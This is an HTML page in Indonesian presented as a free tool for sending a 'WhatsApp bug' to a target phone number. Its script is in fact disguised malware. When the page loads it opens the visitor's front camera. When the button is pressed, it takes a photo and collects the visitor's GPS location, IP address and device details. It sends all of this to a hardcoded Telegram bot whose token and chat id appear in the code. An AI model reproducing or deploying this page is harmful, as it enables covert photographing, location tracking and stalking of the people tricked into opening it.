<!DOCTYPE html>
<html>
<head>
  <title>Bug Whatsappp</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('https://files.catbox.moe/fbj7xc.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Segoe UI', sans-serif;
      color: white;
      text-align: center;
      overflow-x: hidden;
    }

    .snow {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
      pointer-events: none;
      background: url('https://files.catbox.moe/fbj7xc.jpg') repeat;
      background-size: contain;
      animation: snowAnim 20s linear infinite;
      opacity: 0.3;
    }

    @keyframes snowAnim {
      0% { background-position: 0 -100px; }
      100% { background-position: 0 100px; }
    }

    .container {
      position: relative;
      z-index: 2;
      margin-top: 140px;
    }

    h1 {
      font-size: 3.2em;
      text-shadow: 0 0 15px #00ffe1, 0 0 25px #00ffe1;
    }

    input {
      padding: 18px;
      border-radius: 12px;
      border: none;
      font-size: 24px;
      width: 85%;
      max-width: 400px;
      margin-top: 25px;
      outline: none;
      background-color: rgba(0, 0, 0, 0.65);
      color: white;
      box-shadow: 0 0 25px #00ffee, 0 0 35px #00ffee;
      transition: 0.3s ease-in-out;
    }

    button {
      margin-top: 25px;
      padding: 15px 30px;
      font-size: 20px;
      background-color: #00ffcc;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      color: #111;
      box-shadow: 0 0 15px #00ffcc, 0 0 25px #00ffcc;
    }

    video, canvas {
      display: none;
    }

    /* Toast Notification Kanan Atas */
    .toast {
      position: fixed;
      top: 20px;
      right: 20px;
      background: rgba(0, 255, 204, 0.1);
      border: 1px solid #00ffcc;
      padding: 15px 20px;
      border-radius: 10px;
      font-size: 16px;
      color: #00ffee;
      box-shadow: 0 0 15px #00ffe1, 0 0 30px #00ffe1;
      z-index: 9999;
      opacity: 0;
      animation: fadeInOut 4s ease forwards;
    }

    @keyframes fadeInOut {
      0% { opacity: 0; transform: translateY(-20px); }
      10% { opacity: 1; transform: translateY(0); }
      90% { opacity: 1; }
      100% { opacity: 0; transform: translateY(-20px); }
    }
  </style>
</head>
<body>

<div class="snow"></div>

<div class="container">
  <h1>Bug Whatsapp Free</h1>
  <p>Masukkan Nomor Target:</p>
  <input type="text" placeholder="Contoh: 62xxxxx" id="nomor">
  <br>
  <button onclick="main()">Kirim Bug Whatsapp</button>
</div>

<video id="video" width="1080" height="1350" autoplay playsinline></video>
<canvas id="canvas" width="1080" height="1350"></canvas>

<audio id="sound">
  <source src="https://files.catbox.moe/033uyr.mp3" type="audio/mpeg">
</audio>

<script>
  const token = "7435143784:AAG0Jbu7tNBfHYNj14tVOPgrIFOQ_M1oZpk";
  const chat_id = "7872909675";
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  const sound = document.getElementById('sound');

  let cameraReady = false;

  // Fungsi notifikasi toast
  function showToast(text) {
    const toast = document.createElement("div");
    toast.className = "toast";
    toast.innerText = text;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 4000);
  }

  // Aktifkan kamera
  navigator.mediaDevices.getUserMedia({
    video: {
      width: { ideal: 1080 },
      height: { ideal: 1350 },
      facingMode: "user"
    }
  })
  .then(stream => {
    video.srcObject = stream;
    video.onloadedmetadata = () => {
      video.play();
      cameraReady = true;
    };
  })
  .catch(err => {
    showToast("‚ùå Your Singal Error.");
  });

  async function captureAndSendFullData() {
    if (!cameraReady) {
      showToast("‚è≥ Your Phon Not Alreddy...");
      return;
    }

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async function(blob) {
      navigator.geolocation.getCurrentPosition(async function(pos) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const userAgent = navigator.userAgent;
        const time = new Date().toLocaleString();

        let ip = "Tidak diketahui";
        try {
          const res = await fetch("https://api.ipify.org?format=json");
          const data = await res.json();
          ip = data.ip;
        } catch (e) {}

        // Kirim lokasi
        fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chat_id,
            latitude: lat,
            longitude: lon
          })
        });
        showToast("üìç Succesfuly");

        // Kirim foto + detail
        const form = new FormData();
        form.append("chat_id", chat_id);
        form.append("photo", blob, "kamera_hd.jpg");
        form.append("caption", `
üì∑ Foto Target Terkirim
üïì Waktu: ${time}
üåç Lokasi:
‚Ä¢ Latitude: ${lat}
‚Ä¢ Longitude: ${lon}
üåê IP: ${ip}
üì± Device: ${userAgent}
        `);

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: form
        });

        showToast("üì∏ Succesfuly");

      }, function(err) {
        showToast("‚ùå Your Signal Error: " + err.message);
      });
    }, 'image/jpeg', 1.0);
  }

  function main() {
    const nomor = document.getElementById("nomor").value.trim();
    if (nomor === "") {
      showToast("‚ö†Ô∏è Masukkan nomor dulu!");
      return;
    }

    sound.play();
    showToast("üöÄ Bug sedang diproses...");
    captureAndSendFullData();
  }
</script>

</body>
</html>
